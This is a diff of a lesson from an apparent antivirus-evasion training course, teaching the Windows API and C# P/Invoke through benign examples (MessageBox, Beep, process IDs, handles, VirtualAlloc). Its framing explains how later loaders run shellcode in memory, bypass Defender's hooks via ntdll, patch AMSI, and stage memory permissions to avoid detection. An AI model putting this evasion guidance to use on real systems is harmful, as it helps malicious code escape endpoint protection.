@@ -8,82 +8,96 @@ Your lab is running with Windows 11 (Defender on, default settings), Kali Linux,
 
 ## Why This Is Next
 
-Every program you have written so far does only two things: it processes data (math, XOR, loops) and it prints text to the screen. That is all C# can do on its own. C# cannot create a window. C# cannot allocate a block of memory and mark it as executable. C# cannot open another running program and write data into it. C# cannot start a new thread of execution.
+Every program you wrote in Document 02 does two things: it processes data (math, XOR, loops) and it prints text to the screen. That is all C# can do by itself.
 
-All of these things are controlled by Windows. Your C# program has to ask Windows to do them. The way a program asks Windows to do something is by calling a Windows API function.
+But the shellcode loaders in Documents 05 through 10 need to do things that C# cannot do by itself. They need to request a section of your computer's RAM, mark that section as executable so the CPU can run code from it, copy shellcode bytes into it, and tell the CPU to start running those bytes. These are things that only the Windows operating system can do. Your program has to ask Windows to do them.
 
-The shellcode loaders in Documents 05 through 10 all need Windows to do specific things: give the program a block of executable memory, copy bytes into that memory, and start running those bytes as code. Without the Windows API, none of this is possible. This document teaches you what the Windows API is, how it works, and how to call it from C#.
+The way a program asks Windows to do something is by calling a Windows API function. This document teaches you what the Windows API is, what these terms mean, and how to call Windows functions from your C# code.
 
 ## How This Works
 
+### What Is RAM and Why Programs Need It
+
+Your computer has a physical component called RAM (Random Access Memory). It is a hardware stick plugged into your motherboard. When you buy a computer and it says "16 GB RAM," that is the amount of RAM installed.
+
+RAM is your computer's fast, temporary storage. When you open a program, Windows loads that program from your hard drive (where it is stored permanently) into RAM (where it runs temporarily). When you type text in Notepad, that text is stored in RAM while Notepad is open. When you close Notepad without saving, the text disappears because RAM is temporary. When you shut down your computer, everything in RAM is lost.
+
+Why not just use the hard drive for everything? Because RAM is much faster than a hard drive. Your CPU (the processor that runs instructions) can read from RAM in nanoseconds. Reading from a hard drive takes milliseconds, which is thousands of times slower. Programs run in RAM because the CPU needs fast access to their code and data.
+
+When a program runs, it needs space in RAM to store its data. The variables you created in Document 02, the byte arrays, the strings, all of them exist in RAM while your program is running. When your program exits, Windows takes back that RAM space and gives it to other programs that need it.
+
+For shellcode, RAM is critical. Shellcode is code that runs entirely in RAM. It is never saved to your hard drive as a file. Defender's file scanner checks files on your hard drive, but shellcode in RAM is invisible to the file scanner. That is one of the main reasons we run shellcode in RAM instead of saving it as a program on the hard drive.
+
 ### What Windows Does When You Use Your Computer
 
-When you double-click a .exe file on your desktop, Windows creates a new process, loads the program into memory, and starts running it. When the program wants to show a window on screen, it cannot just draw pixels on the monitor by itself. It has to ask Windows to create the window. Windows is the one that draws the title bar, the close button, the minimize button, and the border. The program only tells Windows what text to put in the title bar and how big the window should be.
+When you double-click a .exe file on your desktop, Windows loads that program from the hard drive into RAM, creates a new process for it, and starts running it. When the program wants to show a window on screen, it cannot do that by itself. It has to ask Windows to create the window. Windows draws the title bar, the close button, the minimize button, and the window border. The program only tells Windows what text to put in the title bar and how big the window should be.
 
-When you right-click on your desktop and a menu appears with options like "New", "Display settings", "Personalize", that menu is created by Windows. The desktop program asked Windows to show a menu with those options, and Windows drew it, positioned it next to your mouse cursor, and handled your click on one of the options.
+When you right-click on your desktop and a menu appears with options like "New," "Display settings," "Personalize," that menu is created by Windows. The desktop program asked Windows to show a menu with those options, and Windows drew it, positioned it next to your mouse cursor, and detected your click on one of the options.
 
-When you press Ctrl+Alt+Delete and see the lock screen with options like "Lock", "Switch user", "Sign out", "Task Manager", those buttons and that screen are all created by Windows functions. Every button, every text field, every scroll bar, every dialog box you have ever seen on Windows exists because some program called a Windows function to create it.
+When you press Ctrl+Alt+Delete and see options like "Lock," "Switch user," "Task Manager," those buttons are created by Windows functions. When a program shows a "Save As" dialog with the folder browser, that entire dialog is a single Windows function call. When Task Manager shows you a list of running processes with their CPU and RAM usage, Task Manager is calling Windows functions to get that information.
 
-This is not limited to visual elements. When a program reads a file from your hard drive, it calls a Windows function. When a program connects to the internet, it calls a Windows function. When a program checks how much RAM is available, it calls a Windows function. When a program starts another program, it calls a Windows function.
+This is not limited to things you see on screen. When a program reads a file from your hard drive, it calls a Windows function. When a program connects to the internet, it calls a Windows function. When a program checks how much RAM is available, it calls a Windows function.
 
-Windows controls everything on the computer. Programs run on top of Windows and ask it to do things by calling functions. The collection of all these functions that Windows provides is called the Windows API.
+Windows controls everything on the computer. Programs run on top of Windows and ask it to do things by calling functions. The collection of all the functions that Windows provides for programs to call is called the Windows API. API stands for Application Programming Interface. It is the interface (the set of functions) that applications (programs) use to interact with the Windows platform.
 
-### What an API Is
+### Connecting This to Web APIs You Already Know
 
-You already know what web APIs are. When you send an HTTP GET request to `https://api.github.com/users/octocat`, GitHub's server processes your request and sends back JSON data about that user. You did not write the code that looks up the user. You did not query GitHub's database. You called their API, and their server did the work.
+You know web APIs. When you send an HTTP GET request to `https://api.github.com/users/octocat`, GitHub's server processes your request and sends back JSON data about that user. You did not write the code that queries GitHub's database. You called their API function, and their server did the work and gave you the result.
 
-The Windows API works the same way, except instead of sending HTTP requests over the internet, your program calls functions directly on the same computer. Instead of sending a URL and getting JSON back, your program passes parameters to a function and gets a return value back.
+The Windows API works the same way, except instead of sending HTTP requests over the internet to a remote server, your program calls functions on the same computer. Instead of URLs, you use function names. Instead of JSON request bodies, you pass parameters. Instead of JSON responses, you get return values.
 
-Here is a direct comparison:
+**Web API example:** You call `POST /api/send-notification` with `{"title": "Alert", "message": "Build complete"}`. The server creates the notification and sends it.
 
-**Web API:** You call `POST /api/send-notification` with `{"title": "Alert", "message": "Done"}`. The server creates the notification.
+**Windows API example:** You call a function named `MessageBox` with the parameters `"Alert"` and `"Build complete"`. Windows creates a dialog box on your screen with that title and message, with an OK button, and waits for you to click it.
 
-**Windows API:** You call the function `MessageBox` with parameters `"Alert"` and `"Done"`. Windows creates a dialog box on screen with that title and message, with an OK button, and waits for the user to click it.
-
-In both cases, you are asking a system to do work for you. With web APIs, the system is a remote server. With the Windows API, the system is the Windows operating system running on the same machine.
+Both cases are the same idea: you ask a system to do work for you by calling a function with parameters, and the system does the work. With web APIs, the system is a remote server. With the Windows API, the system is the Windows operating system on your own machine.
 
 ### Where Windows API Functions Live: DLL Files
 
-Windows has thousands of API functions. They are organized into files called DLLs. DLL stands for Dynamic Link Library. A DLL is a file on your hard drive that contains compiled code, specifically a collection of functions that programs can call.
+Windows has thousands of API functions. They are organized into files called DLLs. DLL stands for Dynamic Link Library. A DLL is a file on your hard drive that contains a collection of compiled functions that any program can call.
 
-Open File Explorer on your Windows VM and go to `C:\Windows\System32\`. You will see hundreds of .dll files. Each file contains a group of related functions. Here are the ones that matter for this curriculum:
+You can see these files right now. Open File Explorer on your Windows VM and go to `C:\Windows\System32\`. You will see hundreds of .dll files. Each file contains a group of related functions.
 
-**kernel32.dll** contains functions for the core operations every program needs. Functions for managing memory (allocating it, freeing it, changing its permissions), managing processes (starting them, opening them, reading their information), managing threads (creating new threads of execution), and working with files (reading, writing, deleting). This is the most important DLL for the loaders because it contains the memory and thread functions that execute shellcode.
+The DLLs that matter for this curriculum:
 
-**user32.dll** contains functions for everything you see on screen. Creating windows, showing dialog boxes, handling mouse clicks, drawing menus, managing the clipboard. This DLL is not important for the loaders, but it is useful for learning because the functions produce visible results you can see immediately.
+**kernel32.dll** contains functions for core operations. Functions for working with RAM (requesting a section of RAM, releasing it, changing what you can do with it), managing processes (starting programs, opening running programs), managing threads (creating new threads of execution inside a program), and working with files. This is the most important DLL for the loaders because it has the RAM and thread functions needed to run shellcode.
 
-**ntdll.dll** contains the lowest-level functions in Windows before the actual kernel. Every function in kernel32.dll internally calls a corresponding function in ntdll.dll. For example, when a program calls `VirtualAlloc` from kernel32.dll to allocate memory, kernel32 internally calls `NtAllocateVirtualMemory` from ntdll.dll. ntdll.dll then makes the actual system call to the Windows kernel. This matters for evasion because Defender places monitoring code inside kernel32.dll functions. Document 07 teaches you to skip kernel32.dll and call ntdll.dll directly, so Defender's monitoring code never runs.
+**user32.dll** contains functions for everything you see on screen. Creating windows, showing dialog boxes, handling mouse clicks, drawing menus, managing the clipboard. This DLL is not important for the loaders, but it is useful for learning because the functions produce results you can see on your screen immediately.
 
-**amsi.dll** contains the Antimalware Scan Interface functions. When PowerShell wants to check if a script is malicious before running it, it calls a function in amsi.dll. amsi.dll sends the script to Defender for scanning. If Defender says the script is malware, amsi.dll tells PowerShell to block it. Document 08 teaches you to modify the functions in amsi.dll so they stop sending scripts to Defender.
+**ntdll.dll** contains the lowest-level functions before the actual Windows kernel (the core of the operating system). Every function in kernel32.dll internally calls a function in ntdll.dll to do the real work. For example, when you call VirtualAlloc from kernel32.dll to request a section of RAM, kernel32 internally calls NtAllocateVirtualMemory in ntdll.dll, and ntdll makes the actual request to the Windows kernel. This matters for evasion because Defender inserts monitoring code inside kernel32.dll functions. If you skip kernel32.dll and call ntdll.dll directly, Defender's monitoring code never runs. Document 07 teaches this.
 
-### How C# Calls a Windows API Function: DllImport
+**amsi.dll** contains functions for the Antimalware Scan Interface. When PowerShell wants to check if a script is malicious before running it, it calls a function in amsi.dll. That function sends the script to Defender for scanning. If Defender says the script is malware, amsi.dll tells PowerShell to block it. Document 08 teaches you to modify amsi.dll's functions so they stop sending scripts to Defender.
 
-C# is a managed language. It runs inside the .NET runtime, which handles memory management, type safety, and garbage collection. Windows API functions are unmanaged code written in C and C++. They do not run inside the .NET runtime. They run directly on the operating system.
+### How C# Calls a Windows API Function
 
-To call an unmanaged Windows function from managed C# code, you use something called P/Invoke. P/Invoke stands for Platform Invoke. It is a feature built into C# that lets you declare a Windows function in your C# code and then call it as if it were a normal C# function.
+C# is a programming language that runs inside something called the .NET runtime. The .NET runtime manages your program's RAM for you, handles type checking, and cleans up after your program. All the C# programs you wrote in Document 02 run inside this .NET runtime.
 
-The way you declare a Windows function is with `[DllImport]`. You tell C# three things: which DLL file the function is in, what the function is called, and what parameters it takes. C# handles the rest. It finds the DLL, locates the function inside it, converts your C# data types to the types the function expects, calls the function, and converts the result back to a C# type.
+Windows API functions are not written in C#. They are written in C and C++ and they do not run inside the .NET runtime. They run directly on the operating system. So there is a gap between your C# code (which runs inside the .NET runtime) and Windows functions (which run directly on the operating system).
+
+C# has a built-in feature that bridges this gap. It is called P/Invoke, which stands for Platform Invoke. "Platform" means the Windows platform (the operating system). "Invoke" means to call a function. So P/Invoke literally means "call a function on the Windows platform." It is a C# feature that lets you declare a Windows function in your C# code and then call it as if it were a normal C# function you wrote yourself.
+
+You use P/Invoke by writing `[DllImport]` above a function declaration. DllImport tells C# which DLL file the function lives in. You then describe the function's name, its parameters, and what it returns. After that, you call it like any other function. C# finds the DLL file, locates the function inside it, converts your C# data to the format the Windows function expects, calls the function, converts the result back to C# format, and gives you the return value.
 
 ## What Defender Does
 
-Defender monitors how programs interact with the Windows API at multiple levels:
+Defender monitors how programs interact with Windows API functions:
 
-**Scanning the import table.** When you compile a C# program that uses DllImport, the compiled file contains a list of every DLL and function your program imports. This list is called the import table. Defender reads this table before the program even runs. If the import table shows a program importing VirtualAlloc, CreateThread, and WriteProcessMemory together, Defender knows this combination is commonly used for code injection. Defender can flag the file as suspicious based on the import table alone.
+**Scanning the import table.** When you compile a C# program that uses DllImport, the compiled file contains a list of every DLL and function your program calls. This list is called the import table. Defender reads this list before the program even runs. If the import table shows that your program calls VirtualAlloc, CreateThread, and WriteProcessMemory together, Defender flags it as suspicious because that combination of functions is commonly used for code injection.
 
-**Hooking API functions.** When your program runs and calls a function like VirtualAlloc, Defender has already modified the beginning of VirtualAlloc inside kernel32.dll. Defender inserted a small piece of code (called a hook) that redirects the call to Defender's own monitoring code first. Defender checks what you are requesting (how much memory, what permissions), decides if it looks suspicious, logs the activity, and then lets the real VirtualAlloc run. This monitoring happens every time any program calls VirtualAlloc. Document 07 teaches you to bypass these hooks by calling ntdll.dll directly instead of going through kernel32.dll.
+**Hooking functions.** When your program runs and calls a function like VirtualAlloc from kernel32.dll, Defender has already modified the beginning of VirtualAlloc. Defender inserted a small piece of code (called a hook) that redirects the call to Defender's monitoring code first. Defender checks what you are requesting (how much RAM, what permissions), logs the activity, decides if it looks suspicious, and then lets the real VirtualAlloc run. Document 07 teaches you to bypass these hooks by calling ntdll.dll directly.
 
-**Watching for suspicious sequences.** Individual API calls are not always suspicious. A program calling VirtualAlloc is normal. But a program that calls VirtualAlloc, then copies data into that memory, then changes the memory permissions to executable, then creates a new thread at that address matches the exact pattern of a shellcode loader. Defender's behavioral analysis watches for these sequences.
+**Watching for suspicious sequences.** A program calling VirtualAlloc alone is not suspicious. But a program that requests a section of RAM, copies data into it, changes the permissions to executable, and then creates a new thread at that address matches the exact pattern of a shellcode loader. Defender watches for this sequence of calls.
 
 ## The Evasion Technique
 
-This document teaches the standard way to call Windows functions. You need to understand the standard way before the evasive ways in later documents make sense. The evasive variations you will learn later are:
+This document teaches the standard way to call Windows functions. You need to understand the standard way before the evasion methods in later documents make sense. The evasion variations are:
 
 - Document 06: Encrypt the shellcode with XOR so Defender does not recognize the bytes
 - Document 07: Call ntdll.dll directly instead of kernel32.dll to bypass Defender's hooks
 - Document 08: Modify amsi.dll functions so they stop scanning scripts
-- Document 10: Use all evasion techniques together
+- Document 10: All evasion techniques combined
 
-All of these build on the standard API calling pattern you learn here.
+All of them build on the standard calling pattern you learn here.
 
 ## Getting the Loader Onto the Target
 
@@ -91,16 +105,18 @@ No loader in this document. All programs are learning exercises that run on your
 
 ## Teaching the Code
 
-### Part 1: Your First Windows API Call - MessageBox
+### Part 1: MessageBox - Your First Windows API Call
 
-The simplest Windows API function to call is MessageBox. It creates a dialog box on your screen with a message and buttons. It is not useful for evasion, but it is the perfect first example because you can see the result immediately on your screen.
+The simplest Windows API function to understand is MessageBox. It creates a dialog box on your screen with a message and buttons. It is not useful for evasion, but it is the perfect first example because you can see the result on your screen immediately.
 
 ```csharp
 using System;
 using System.Runtime.InteropServices;
 ```
 
-The first line you already know from Document 02. The second line brings in the tools needed for P/Invoke. `System.Runtime.InteropServices` contains the `[DllImport]` attribute and the `Marshal` class. You need this line in every program that calls Windows functions.
+The first line you know from Document 02. It gives you access to Console.WriteLine and other basic C# tools.
+
+The second line gives you access to P/Invoke tools. Remember, P/Invoke is the C# feature that lets you call Windows functions. `System.Runtime.InteropServices` is the section of C# that contains this feature. "InteropServices" means "services for interoperating (working together) with code outside of C#." You need this line in every program that calls Windows functions.
 
 ```csharp
 class Program
@@ -109,23 +125,23 @@ class Program
     static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
 ```
 
-This is the P/Invoke declaration. Here is what each part means:
+This is the P/Invoke declaration. It tells C# about a Windows function so C# knows how to call it. Here is what each part means:
 
-`[DllImport("user32.dll", CharSet = CharSet.Unicode)]` tells C# that the next function exists in user32.dll. `CharSet = CharSet.Unicode` tells C# to convert text strings to Unicode format when passing them to Windows, because Windows uses Unicode for text internally.
+`[DllImport("user32.dll", CharSet = CharSet.Unicode)]` is an instruction attached to the function below it. It tells C# two things: the function lives in the file user32.dll, and when passing text to this function, convert it to Unicode format (Unicode is the text encoding Windows uses internally).
 
-`static extern` tells C# that you are not writing this function yourself. The function already exists in user32.dll. You are just telling C# what it looks like so C# knows how to call it.
+`static extern` tells C# that you did not write this function. The function already exists in user32.dll. You are just describing what it looks like so C# knows how to call it. `extern` means "this function is external, it exists outside of this C# program."
 
-`int MessageBox(...)` says the function is called MessageBox and it returns an integer. The return value tells you which button the user clicked.
+`int MessageBox(...)` says the function is called MessageBox and it gives back an integer when it finishes. The integer tells you which button the user clicked.
 
 The four parameters:
 
-`IntPtr hWnd` is the handle of the parent window. If you pass `IntPtr.Zero` (which means null, no parent), the dialog box appears on its own, not attached to any window.
+`IntPtr hWnd` is the handle (reference number) of the parent window. If you pass `IntPtr.Zero` (which means no parent), the dialog box appears by itself, not attached to any window. Handles are explained in Part 4.
 
-`string text` is the message that appears inside the dialog box.
+`string text` is the message shown inside the dialog box body.
 
-`string caption` is the text in the title bar of the dialog box.
+`string caption` is the text in the title bar at the top of the dialog box.
 
-`uint type` controls which buttons appear. `0` shows only an OK button. `1` shows OK and Cancel buttons. `4` shows Yes and No buttons.
+`uint type` controls which buttons appear. The value `0` shows only OK. The value `1` shows OK and Cancel. The value `4` shows Yes and No.
 
 Now call it:
 
@@ -139,7 +155,7 @@ Now call it:
             1);
 ```
 
-This calls the MessageBox function in user32.dll. Windows receives the call, creates a dialog box with your message, your title, and OK/Cancel buttons, and shows it on screen. The program pauses here and waits for you to click a button. When you click, Windows returns a number telling you which button was clicked.
+Your program calls MessageBox. C# finds the function in user32.dll and calls it with your parameters. Windows receives the call, creates a dialog box with your message, your title, OK and Cancel buttons, and shows it on screen. Your program pauses here and waits for you to click a button. When you click, Windows tells your program which button was clicked by returning a number.
 
 ```csharp
         if (clicked == 1)
@@ -150,7 +166,7 @@ This calls the MessageBox function in user32.dll. Windows receives the call, cre
 }
 ```
 
-MessageBox returns 1 if the user clicked OK, and 2 if the user clicked Cancel.
+MessageBox returns 1 if you clicked OK, 2 if you clicked Cancel.
 
 Here is the complete program:
 
@@ -179,31 +195,33 @@ class Program
 }
 ```
 
-Run it with `dotnet run`. A dialog box appears on your Windows VM. It has a title bar that says "Windows API Test", your message text in the body, and OK and Cancel buttons. Click one. The terminal prints which button you clicked.
+Run it with `dotnet run`. A dialog box appears on your Windows VM. It has a title bar that says "Windows API Test," your message text, and two buttons. Click one. The terminal prints which button you clicked.
 
-You just called a Windows API function from C#. Your C# code did not draw the dialog box. Your C# code did not create the buttons. Your C# code did not handle the mouse click. Windows did all of that. Your code only said "show a dialog with this text and these buttons" and Windows handled everything else.
+Your C# code did not draw the dialog box. It did not create the buttons. It did not detect your mouse click. Windows did all of that. Your code said "show a dialog with this text and these buttons" and Windows handled everything else. That is what calling a Windows API function means.
 
-### Part 2: Beep - An Even Simpler Windows API Call
+### Part 2: Beep - Calling a Function from a Different DLL
 
-MessageBox has multiple parameters and a return value. Here is an even simpler Windows function to reinforce how DllImport works:
+MessageBox lives in user32.dll. Here is a function from kernel32.dll to show that different DLLs contain different functions, and you just change the DLL name in DllImport:
 
 ```csharp
     [DllImport("kernel32.dll")]
     static extern bool Beep(uint frequency, uint duration);
 ```
 
-This function lives in kernel32.dll (not user32.dll). It makes a beep sound through the computer's speaker. `frequency` is the pitch in Hertz (440 is the musical note A). `duration` is how long to beep in milliseconds. It returns `true` if the beep played and `false` if it failed.
+This function lives in kernel32.dll. It makes a beep sound through the computer's speaker. `frequency` is the pitch in Hertz (440 is the musical note A). `duration` is how long the beep lasts in milliseconds (1000 milliseconds = 1 second). It returns `true` if the beep played successfully.
 
 ```csharp
     static void Main(string[] args)
     {
-        Console.WriteLine("[*] Playing a beep...");
-        Beep(440, 500);
+        Console.WriteLine("[*] Playing three beeps...");
+        Beep(440, 300);
+        Beep(554, 300);
+        Beep(659, 300);
         Console.WriteLine("[+] Done.");
     }
 ```
 
-This tells Windows: "play a 440 Hz tone for 500 milliseconds." Windows generates the sound. Your code did not create audio data, did not interact with the sound card, did not do any audio processing. It called one function and Windows did everything.
+Three calls to the same Windows function with different parameters. Each call tells Windows "play this frequency for this many milliseconds." Windows generates the sound through the speaker. Your code did not create audio data, did not interact with the sound hardware, did not process audio signals. One function call, and Windows did all the work.
 
 Here is the complete program:
 
@@ -227,36 +245,35 @@ class Program
 }
 ```
 
-Run it. You hear three tones (A, C#, E, which makes a major chord). Three function calls, three beeps. Each call tells Windows "play this frequency for this duration" and Windows does it.
-
-The pattern is always the same: declare the function with DllImport, specify the DLL, describe the parameters, and call it. Whether the function creates a dialog box, plays a sound, allocates memory, or opens a process, the pattern does not change.
+Run it. You hear three tones. The pattern is always the same: write `[DllImport("dllname.dll")]`, describe the function, call it. Whether the function shows a dialog box, plays a sound, requests RAM, or opens a process, the pattern is identical.
 
 ### Part 3: GetCurrentProcessId - Getting Information from Windows
 
-The previous two examples told Windows to do something (show a dialog, play a sound). Windows API functions can also give you information. GetCurrentProcessId tells you the process ID (PID) of your running program.
+MessageBox and Beep tell Windows to do something. Windows API functions can also give you information about the system.
 
-Every running program on Windows has a unique number called a process ID. Open Task Manager on your Windows VM (press Ctrl+Shift+Esc). You see a list of all running programs. If you right-click on the column headers at the top and enable "PID", you see the process ID for each one. Windows assigns these numbers when programs start, and uses them internally to keep track of which program is which.
+Every running program on Windows has a unique number called a process ID (PID). Windows assigns this number when the program starts and uses it internally to track which program is which. Open Task Manager on your Windows VM (press Ctrl+Shift+Esc). Click "More details" if needed. You see a list of running programs. If you right-click on the column headers and enable the "PID" column, you see each program's process ID. Those numbers came from Windows when each program started.
+
+GetCurrentProcessId gives you your own program's process ID:
 
 ```csharp
     [DllImport("kernel32.dll")]
     static extern uint GetCurrentProcessId();
 ```
 
-This function lives in kernel32.dll. It takes no parameters (the empty parentheses mean nothing goes in). It returns a `uint`, which is the process ID of the program that called the function.
+This function lives in kernel32.dll. It takes no parameters (empty parentheses). It returns a `uint` (unsigned integer), which is your program's process ID number.
 
 ```csharp
     static void Main(string[] args)
     {
         uint myPid = GetCurrentProcessId();
         Console.WriteLine("[+] This program's process ID is: " + myPid);
-        Console.WriteLine("[*] Open Task Manager and find this number to verify.");
+        Console.WriteLine("[*] Open Task Manager and find this number to confirm.");
         Console.WriteLine("[*] Press Enter to exit...");
         Console.ReadLine();
     }
-}
 ```
 
-`Console.ReadLine()` waits for you to press Enter. This keeps the program running so you have time to open Task Manager and find the PID.
+`Console.ReadLine()` pauses the program until you press Enter. This gives you time to open Task Manager and verify the PID.
 
 Here is the complete program:
 
@@ -273,26 +290,29 @@ class Program
     {
         uint myPid = GetCurrentProcessId();
         Console.WriteLine("[+] This program's process ID is: " + myPid);
-        Console.WriteLine("[*] Open Task Manager and find this number to verify.");
+        Console.WriteLine("[*] Open Task Manager and find this number to confirm.");
         Console.WriteLine("[*] Press Enter to exit...");
         Console.ReadLine();
     }
 }
 ```
 
-Run it. It prints a number. Open Task Manager, look for "dotnet" in the process list, and confirm the PID matches. You asked Windows a question ("what is my process ID?") and Windows gave you the answer.
+Run it. It prints a number. Open Task Manager, find "dotnet" in the list, confirm the PID matches. You asked Windows "what is my process ID?" and Windows gave you the answer.
 
-### Part 4: Handles - How Windows Tracks Resources
+### Part 4: What Is a Handle
 
-Before going further, you need to understand handles. Almost every Windows API function that gives you access to something (a file, a process, a thread, a block of memory) returns a handle.
+Almost every Windows API function that gives you access to something returns a handle. You need to understand handles before going further.
 
-When you open a file in Notepad, Windows does not hand Notepad the physical sectors on your hard drive. Windows gives Notepad a handle, which is a number. That number is Windows' internal reference for "the file that Notepad opened." When Notepad wants to read data from the file, it passes the handle back to Windows and says "read from this handle." Windows looks up the handle, finds the file it refers to, reads the data, and sends it to Notepad.
+When you open a file in Notepad, Windows does not give Notepad direct access to the hard drive sectors where the file is stored. Instead, Windows gives Notepad a number. That number is Notepad's reference to that file. When Notepad wants to read data from the file, it passes that number back to Windows and says "read from this." When Notepad is done, it passes the number back and says "close this." Windows looks up the number in its internal records, finds which file it refers to, and does the operation.
 
-When you open Task Manager, Task Manager calls OpenProcess to get information about running processes. Windows does not give Task Manager direct access to those processes. Windows gives Task Manager handles to them. Task Manager passes those handles to other functions to get process names, memory usage, and CPU usage.
+That number is called a handle. A handle is a reference number that Windows gives to a program so the program can refer to a specific resource (a file, a running process, a thread, a section of RAM) without having direct access to it. Windows keeps track of what each handle refers to internally.
 
-In C#, handles are stored as `IntPtr` values. When a Windows function returns `IntPtr.Zero` (the number 0), it means the function failed. A valid handle is always a non-zero number.
+Handles are used for everything in Windows, not just files:
+- When you open another running process with OpenProcess, Windows gives you a handle to that process
+- When you create a new thread with CreateThread, Windows gives you a handle to that thread
+- When you open a file, Windows gives you a handle to that file
 
-The pattern you will see in every loader:
+In C#, handles are stored as `IntPtr` values. When a Windows function fails, it returns `IntPtr.Zero` (the number zero) as the handle, meaning "I could not do what you asked, so there is no valid handle." Every time you call a Windows function that returns a handle, you check if it returned zero:
 
 ```csharp
         IntPtr handle = SomeWindowsFunction();
@@ -301,12 +321,9 @@ The pattern you will see in every loader:
             Console.WriteLine("[-] Function failed.");
             return;
         }
-        Console.WriteLine("[+] Got handle: 0x" + handle.ToString("X"));
 ```
 
-Call the function, check if it returned zero, stop if it failed, continue if it succeeded.
-
-When you are done with a handle, you tell Windows to close it:
+When you are done with a handle, you tell Windows to close it using CloseHandle:
 
 ```csharp
     [DllImport("kernel32.dll")]
@@ -317,17 +334,19 @@ When you are done with a handle, you tell Windows to close it:
         CloseHandle(handle);
 ```
 
-This tells Windows "I am done with this resource, you can clean it up." If you do not close handles, they stay open and waste system resources. In the loaders, the program usually exits after running shellcode, and Windows cleans up all handles when a process exits. But for anything that runs longer, you should close handles when you are done with them.
+This tells Windows "I am done with this resource, you can clean it up." If you do not close handles, they stay open and waste system resources. In the loaders, the program usually exits after running shellcode, and Windows cleans up all handles when a process exits. But for longer-running programs, you should close handles when you are done.
 
-### Part 5: VirtualAlloc - Getting a Block of Memory from Windows
+### Part 5: VirtualAlloc - Requesting a Section of RAM from Windows
 
-Now we get to the functions that matter for shellcode execution. The first one is VirtualAlloc, which asks Windows to give your program a block of memory.
+Now we get to the functions that matter for shellcode execution. VirtualAlloc asks Windows to give your program a section of RAM with specific permissions.
 
-In Document 02, you created byte arrays with `new byte[256]`. C# allocated memory for that array and managed it for you. But C# controls that memory completely. C# decides where the array goes in memory. C# can move it around during garbage collection. And most importantly, C# marks all array memory as data-only. The CPU is not allowed to execute code from a C# byte array. This is a security feature called DEP (Data Execution Prevention). DEP prevents attackers from putting code into data areas and running it.
+In Document 02, you created byte arrays with `new byte[256]`. The .NET runtime (the environment that runs your C# program) gave your program space in RAM for that array. But the .NET runtime controls that RAM completely. It decides where in RAM the array goes. It can move the array to a different location in RAM during garbage collection (an automatic cleanup process). And most importantly, the .NET runtime marks all of its RAM as data-only. The CPU is not allowed to execute code from RAM that the .NET runtime manages.
 
-Shellcode is code. It needs to run. So you cannot put shellcode in a C# byte array and tell the CPU to execute it. The CPU will refuse.
+This is because of a security feature called DEP, which stands for Data Execution Prevention. DEP tells the CPU "this section of RAM contains data, not code, so do not try to run it as instructions." DEP exists to prevent attackers from putting malicious code into a data area and running it. Every modern operating system has DEP enabled.
 
-VirtualAlloc asks Windows to give you a block of memory with specific permissions that you choose. If you ask for memory with execute permission, the CPU is allowed to run code from it.
+Shellcode is code. You want the CPU to run it as instructions. So you cannot put shellcode into a regular C# byte array because DEP prevents the CPU from executing it.
+
+VirtualAlloc solves this. It asks Windows directly (not the .NET runtime) to give you a section of RAM. When you ask Windows, you specify what permissions you want on that section: can you read from it, can you write to it, and can the CPU execute code from it. If you ask for execute permission, Windows gives you a section of RAM where the CPU is allowed to run code. DEP does not block it because you explicitly asked for execute permission through a legitimate Windows function.
 
 ```csharp
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -338,49 +357,49 @@ VirtualAlloc asks Windows to give you a block of memory with specific permission
         uint flProtect);
 ```
 
-`SetLastError = true` tells C# to save the Windows error code if VirtualAlloc fails, so you can find out why.
+`SetLastError = true` tells C# to remember the error code if VirtualAlloc fails, so you can find out why it failed.
 
 The four parameters:
 
-`IntPtr lpAddress` is the memory address where you want the block. Pass `IntPtr.Zero` to let Windows pick the address. You almost always let Windows choose because it knows which addresses are available.
+`IntPtr lpAddress` is the RAM address where you want the section. Pass `IntPtr.Zero` to let Windows choose the address for you. Windows knows which addresses are available, so you almost always let Windows pick.
 
-`uint dwSize` is how many bytes of memory you want. If your shellcode is 510 bytes, you request 510 bytes.
+`uint dwSize` is how many bytes of RAM you want. If your shellcode is 510 bytes, you request 510 bytes.
 
-`uint flAllocationType` controls the type of allocation. The value `0x3000` means "reserve the address range and make the memory pages ready to use." This is the value you use in every loader. It is a combination of MEM_COMMIT (0x1000, which prepares the memory pages for use) and MEM_RESERVE (0x2000, which reserves the address range so nothing else uses it). You combine them: 0x1000 + 0x2000 = 0x3000.
+`uint flAllocationType` is the type of allocation. The value `0x3000` means "reserve the address range so nothing else uses it AND prepare the RAM pages for use." This is a combination of two flags: MEM_RESERVE (0x2000) which reserves the address range, and MEM_COMMIT (0x1000) which prepares the actual RAM pages. You combine them by adding: 0x2000 + 0x1000 = 0x3000. You use this value in every loader.
 
-`uint flProtect` sets the permissions for the memory. This is the most important parameter for shellcode execution:
+`uint flProtect` sets the permissions. This is the most important parameter:
 
-- `0x04` is PAGE_READWRITE. You can read data from this memory and write data to it. You cannot execute code from it. This is like normal data storage.
-- `0x20` is PAGE_EXECUTE_READ. The CPU can execute code from this memory and you can read data from it. You cannot write to it.
+- `0x04` is PAGE_READWRITE. You can read data from this RAM and write data to it. The CPU cannot execute code from it.
+- `0x20` is PAGE_EXECUTE_READ. The CPU can execute code from this RAM and you can read data from it. You cannot write to it.
 - `0x40` is PAGE_EXECUTE_READWRITE. You can read, write, and execute. All permissions at once.
 
-Using `0x40` is the simplest approach because you can write your shellcode in and execute it without any extra steps. But memory that is both writable and executable at the same time is very unusual for legitimate programs. Defender flags it. The safer approach is:
+Using `0x40` is the simplest approach because you can write your shellcode in and the CPU can execute it without any extra steps. But RAM that is both writable and executable at the same time is very unusual for legitimate programs. Defender flags this. The safer approach is:
 
-1. Allocate memory with `0x04` (read-write only, so you can write data into it)
-2. Copy your shellcode bytes into that memory
-3. Change the permissions to `0x20` (execute-read only, so the CPU can run the code)
+1. Request RAM with `0x04` (read-write only, so you can write your shellcode into it)
+2. Copy your shellcode bytes into that RAM
+3. Change the permissions to `0x20` (execute-read only, so the CPU can run it but nobody can write to it anymore)
 
-This two-step approach is less suspicious because the memory is never writable and executable at the same time. While you are writing to it, it is not executable. After it becomes executable, it is no longer writable.
+This way, the RAM is never writable and executable at the same time. While you are writing to it, the CPU cannot execute from it. After the CPU can execute from it, nobody can write to it.
 
